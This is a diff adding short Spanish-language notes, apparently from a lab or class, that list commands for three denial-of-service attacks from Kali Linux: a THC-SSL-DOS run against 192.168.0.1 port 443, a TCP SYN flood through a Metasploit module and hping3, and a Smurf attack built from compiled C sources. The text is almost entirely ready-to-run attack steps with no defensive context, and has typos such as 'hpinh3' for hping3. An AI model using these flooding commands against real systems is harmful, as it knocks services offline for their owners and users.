@@ -1,0 +1,23 @@
+Ataque  THC-SSL-DOS
+En una terminal de kali Linux:
+  thc-ssl-dos  192.168.0.1 -p 443 --accept
+	
+	
+Ataque  TCP-SYNC-FLOOD
+En un terminal de kali Linux:
+	msfconsole
+	use auxiliary/dos/tcp/synflood
+	show options (para ver la forma de configuaracion)
+	set rhost 192.168.0.1(ip del atacado)
+	exploit
+	
+	hpinh3 -p 80 -S --flood 192.168.0.1 
+	
+Ataque  SMURF
+
+En una terminal de Kali Linux, ubicandoneos en al carpoeta smurf (descargada)
+	1.- compitacion de archivos
+	sudo gcc smurf.c -o smurf 
+	sudo gcc flooder_udp.c -o flooder_udp 
+	2.- ataque
+	./smurf 192.168.0.1 broadcast.txt  0 0 1024 
